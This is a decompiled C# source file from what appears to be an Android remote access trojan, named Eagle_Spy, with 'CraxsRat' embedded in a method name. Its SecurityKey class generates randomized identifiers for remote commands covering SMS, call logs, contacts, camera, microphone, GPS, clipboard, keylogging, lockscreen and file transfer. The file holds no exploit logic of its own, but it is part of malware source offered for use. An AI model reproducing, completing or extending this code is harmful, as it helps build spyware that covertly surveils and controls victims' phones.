using System;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[StandardModule]
internal sealed class SecurityKey
{
	public static string getinfo = null;

	public static string getCalls = null;

	public static string getSMS = null;

	public static string getContacts = null;

	public static string getCamera = null;

	public static string Lockscreen = null;

	public static string getfiles = null;

	public static string Bing = null;

	public static string getCommand = null;

	public static string getGSM = null;

	public static string getGPS = null;

	public static string getUpdate = null;

	public static string down_info = null;

	public static string downByte = null;

	public static string upload_info = null;

	public static string uploadByte = null;

	public static string MicwaveOutByte = null;

	public static string ImageViewer = null;

	public static string Apps = null;

	public static string Account = null;

	public static string Information = null;

	public static string MicwaveinByte = null;

	public static string editor = null;

	public static string SHOT = null;

	public static string Keylogger = null;

	public static string AppsProperties = null;

	public static string acquire = null;

	public static string getClipboard = null;

	public static string KeysClient1 = null;

	public static string KeysClient2 = null;

	public static string KeysClient3 = null;

	public static string KeysClient4 = null;

	public static string KeysClient5 = null;

	public static string KeysClient6 = null;

	public static string KeysClient7 = null;

	public static string KeysClient8 = null;

	public static string KeysClient9 = null;

	public static string KeysClient10 = null;

	public static string KeysClient11 = null;

	public static string KeysGetClient = null;

	public static string resultClient = null;

	private static int count;

	public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwejhga()
	{
		getinfo = Key();
		Bing = Key();
		getCalls = Key();
		getContacts = Key();
		getCamera = Key();
		Lockscreen = "ddll";
		getfiles = Key();
		getCommand = Key();
		getGSM = Key();
		getGPS = Key();
		down_info = Key() + ">";
		downByte = Key() + ">";
		upload_info = Key();
		uploadByte = Key();
		MicwaveOutByte = Key();
		ImageViewer = Key() + ">";
		Apps = Key();
		Account = Key();
		Information = Key();
		MicwaveinByte = Key();
		editor = Key();
		SHOT = Key();
		getUpdate = Key();
		Keylogger = Key();
		AppsProperties = Key();
		acquire = Key();
		getClipboard = Key();
		KeysClient1 = "1";
		KeysClient2 = "2";
		KeysClient3 = "3";
		KeysClient4 = "4";
		KeysClient5 = "5";
		KeysClient6 = "6";
		KeysClient7 = "7";
		KeysClient8 = "8";
		KeysClient9 = "9";
		KeysClient10 = "10";
		KeysClient11 = "11";
		KeysGetClient = "-2";
		resultClient = "-1";
	}

	public static string Key()
	{
		checked
		{
			count++;
			return Conversions.ToString(count) + GenRandom(3) + Conversions.ToString(DateTime.Now.Millisecond);
		}
	}

	public static string GenRandom(int Length)
	{
		string text = null;
		string text2 = "qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP";
		for (int i = 1; i <= Length; i = checked(i + 1))
		{
			Thread.Sleep(5);
			Random random = new Random(DateAndTime.Now.Millisecond);
			text += Conversions.ToString(text2[random.Next(0, text2.Length)]);
		}
		return text;
	}
}
